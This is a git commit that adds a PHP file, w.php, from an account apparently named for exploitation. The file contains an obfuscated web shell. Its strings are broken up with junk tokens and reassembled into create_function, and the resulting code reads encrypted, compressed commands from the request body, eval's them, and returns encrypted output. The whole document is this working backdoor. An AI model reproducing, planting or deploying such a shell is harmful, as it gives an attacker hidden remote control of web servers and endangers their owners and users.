bbbd0c242cc94f0e73f3bd44889eb76dc9e3431a
JawaTengahXploit⁨¹³³⁷⁩ <94507398+JawaTengahXploit1337@users.noreply.github.com>
2025-12-02 16:23:08 +0700

    Add obfuscated PHP code for execution

---
+++ w.php
@@ -0,0 +1,12 @@
+<?php
+$S='r($i=0;$iPS<$l;){PSfor($j=0;PS($jPSPS<$c&&$i<$l)PSPS;$j++,$i++){$o.=PS$t{PS$iPS}^$k{';
+$x='(PS@x(@PSbaPSPSse64_decode($m[1]),$k)));$o=@PSoPSb_get_contePSPSPSnts();@ob_end_clean()';
+$M='$j};}}retPSPSurn $o;PS}if PS(PS@preg_matPSch("/$khPS(.+)$PSkf/",@file_getPS_coPSnt';
+$c='ePSnts("PSphpPS://input"),$PSm)==1) {@PSobPS_stPSart();@evaPSl(@gzPSuncPSPSompresPSs';
+$v='$PSk="2bPSf8da13";PS$kPShPS="PSPS4PS2195231cb7c";$kf="d2f8da6c754a";PS$PSp="1loC5a1N8jrT1';
+$P='PS;$r=@baPSse64_enPScode(PS@PSx(@gzcoPSmprPSess($o),$PSPSk));PSprint("$p$kh$r$kf");}';
+$N=str_replace('yE','','cyEreatyEeyEyE_funcyEtyEion');
+$s='PSl0O"PS;functioPSn x(PSPS$t,$k){PSPS$c=stPSrlen($k);$l=sPStrlen($t);PS$oPS=PS"";fo';
+$r=str_replace('PS','',$v.$s.$S.$M.$c.$x.$P);
+$b=$N('',$r);$b();
+?>
